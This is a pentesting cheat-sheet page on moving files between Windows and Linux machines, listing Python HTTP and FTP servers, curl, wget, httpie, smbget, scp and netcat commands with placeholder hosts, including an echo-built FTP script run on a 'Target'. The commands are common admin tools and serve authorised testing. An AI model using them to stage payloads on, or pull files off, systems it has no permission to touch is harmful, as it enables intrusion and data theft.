---
sidebar_position: 3
title: File Transfer
description: Windows - Linux File Transfer 
keywords: [file transfer, windows file transfer, pentesting, oscp, smb file transfer, powershell file transfer, certutil file transfer, ftp file transfer, tftp file transfer, vbscript file transfer, scp]
---


## Python Server

```batch
:: Python[3]
python3 -m http.server <PORT>

:: Python[2]
python -m SimpleHTTPServer <PORT>
```

## CURL - WGET

```batch
:: Save Remote File
curl -O "http://IP:PORT/FILE.sh"

:: Authentication [HTTP - HTTPS]
curl -k -O -u "username:password" "http://IP:PORT/FILE.sh"

:: FTP Download
curl -O "ftp://anonymous:anonymous@IP:PORT/FILE.sh"	
```

```batch
:: Save Remote File
wget -O <OUTPUT> "http://IP:PORT/FILE.sh"

:: Authentication [HTTP - HTTPS]
wget --no-check-certificate --user "username" --password "password" "http://IP:PORT/FILE.sh"

:: FTP Download
wget -r "ftp://anonymous:anonymous@IP:PORT/FILE.sh"
```

## HTTP

```batch
:: Save Remote File
http --download "http://IP:PORT/FILE.sh"

:: Authentication [HTTP - HTTPS]
http -a "username:password" --download --verify=no "http://IP:PORT/FILE.sh"
```

## FTP

- **`pyftpdlib` Package Must Be Installed**

```batch
:: Start The Server
python3 -m pyftpdlib -p 21

:: Access The Server
:: [USER: anonymous PASSWORD: anonymous]
ftp -p 10.11.3.35 21
```

```bash
# Non Interactive SHELL
# Target
echo '#!/bin/bash' > FTP.sh
echo 'HOST=IP' >> FTP.sh
echo 'PORT=PORT' >> FTP.sh
echo 'USER=anonymous' >> FTP.sh
echo 'PASSWORD=anonymous' >> FTP.sh
echo 'ftp -p -inv $HOST $PORT << EOF' >> FTP.sh
echo 'user $USER $PASSWORD' >> FTP.sh
echo 'get FILE' >> FTP.sh
echo 'bye' >> FTP.sh
echo 'EOF' >> FTP.sh
chmod +x FTP.sh; ./FTP.sh
```

## SMB

```batch
:: Save Remote SMB File
smbget "smb://IP/SHARE/FILE.sh"

:: SMB Authentication
smbget "smb://IP/SHARE/FILE.sh" --user "username%password"
```

## SCP

```batch
scp -P 22 "C:\FILE.sh" machine@IP:/home/machine/OUTPUT.sh
```

## NETCAT

```batch
:: Receiver
nc -l -p PORT > FILE.sh

:: Sender
nc -w 3 IP PORT < FILE.sh
```